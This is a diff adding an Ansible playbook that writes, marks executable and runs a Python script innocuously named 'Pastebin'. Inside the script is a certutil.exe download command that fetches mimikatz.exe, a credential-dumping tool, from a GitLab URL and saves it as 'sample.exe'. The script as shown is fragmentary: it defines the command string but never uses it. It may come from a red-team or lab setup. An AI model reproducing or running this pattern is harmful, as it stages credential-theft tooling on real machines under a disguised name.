@@ -1,1 +1,28 @@
+---
+- name: Pastebin
+  copy:
+    dest: /opt/pastebin.py
+    content: |
+       import pexpect
+       import re
+       import json
+       import time
+       
 
+
+       upload_mimikatz="certutil.exe -urlcache -f https://gitlab.com/kalilinux/packages/mimikatz/-/raw/kali/master/x64/mimikatz.exe?ref_type=heads sample.exe"
+       
+
+- name: Make the script executable
+  file:
+    path: /opt/pastebin.py
+    mode: '0755'
+
+
+- name: Run the pastebin
+  shell: python3 /opt/pastebin.py
+  register: pastebin_output
+
+- name: Display the output
+  debug:
+    msg: "{{ pastebin_output.stdout }}"
